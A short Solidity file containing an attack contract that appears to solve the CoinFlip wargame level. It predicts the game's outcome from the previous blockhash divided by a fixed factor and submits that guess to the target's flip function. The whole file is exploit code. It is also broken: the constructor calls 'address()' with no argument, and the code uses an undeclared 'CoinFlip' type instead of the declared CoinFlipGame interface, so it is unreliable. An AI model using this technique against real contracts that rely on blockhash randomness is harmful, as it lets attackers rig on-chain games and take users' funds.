// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
/*
Write a contract that gets the block number, calculates the blockHash -> divide by factor
*/

abstract contract CoinFlipGame {
        function flip(bool _guess) virtual public returns(bool);
}

contract CoinFlipAttack {

    using SafeMath for uint256;
    address coinFlipAddress;

    event CoinFlipAttempts(bool indexed guess, bool indexed result);

    constructor()  {
        // input address of game instance
        coinFlipAddress = address(); 
    }

    function winFlip() public returns(bool) {

        CoinFlip coinFlipgame = CoinFlip(coinFlipAddress);
        
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);

        bool side = coinFlip == 1 ? true : false;
        bool result = coinFlipgame.flip(side);

        emit CoinFlipAttempts(side, result);
        return result;
    }
}